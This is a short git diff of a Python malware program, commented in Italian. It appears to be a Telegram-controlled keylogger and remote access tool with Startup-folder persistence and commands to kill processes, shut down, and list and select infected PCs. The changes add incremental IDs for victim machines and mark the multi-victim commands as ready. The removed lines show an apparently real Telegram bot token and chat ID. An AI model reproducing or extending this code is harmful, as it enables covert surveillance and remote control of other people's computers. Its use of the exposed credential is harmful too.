@@ -11,8 +11,8 @@ import subprocess
 from datetime import datetime
 
 # Configurazione del bot Telegram
-TOKEN = '7752928416:AAGMJGxwFDM8n6GED2SpMyzYsjGej2P_-74'  # Sostituisci con il token del tuo bot
-CHAT_ID = '5726194160'  # Sostituisci con il tuo chat ID
+TOKEN = 'YOUR TOKEN'  # Sostituisci con il token del tuo bot
+CHAT_ID = 'TOUR CHATID'  # Sostituisci con il tuo chat ID
 bot = telebot.TeleBot(TOKEN)
 
 # Variabile per memorizzare i tasti premuti
@@ -31,9 +31,24 @@ STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Sta
 active_users = {}
 
 
+# Funzione per generare un ID incrementale (PC1, PC2, PC3, ...)
+def get_next_id():
+    # Trova il numero più alto tra gli ID esistenti
+    max_id = 0
+    for unique_id in active_users.keys():
+        if unique_id.startswith("PC"):
+            try:
+                current_id = int(unique_id[2:])  # Estrae il numero da "PC1", "PC2", ecc.
+                if current_id > max_id:
+                    max_id = current_id
+            except ValueError:
+                continue
+    return f"PC{max_id + 1}"  # Restituisce il prossimo ID disponibile
+
+
 # Funzione per generare un identificatore unico per ogni istanza
 def get_unique_identifier():
-    return f"{socket.gethostname()}_{socket.gethostbyname(socket.gethostname())}"
+    return get_next_id()
 
 
 # Funzione per inviare un messaggio all'avvio
@@ -164,12 +179,12 @@ def generate_help_message():
 /panic 🟢 READY
 /taskkill 🟢 READY
 /shutdown 🟢 READY
-/users 🟡 READY
-/selectuser 🟡 READY
+/users 🟢 READY
+/selectuser 🟢 READY
 /help 🟢 READY
 
 🟢 READY: Comando funzionante
-🟡 PROGRESS: Comando in sviluppo / comando i BETA
+🟡 PROGRESS: Comando in sviluppo
 🔴 DONT WORK: Comando non funzionante
 """
     return help_message
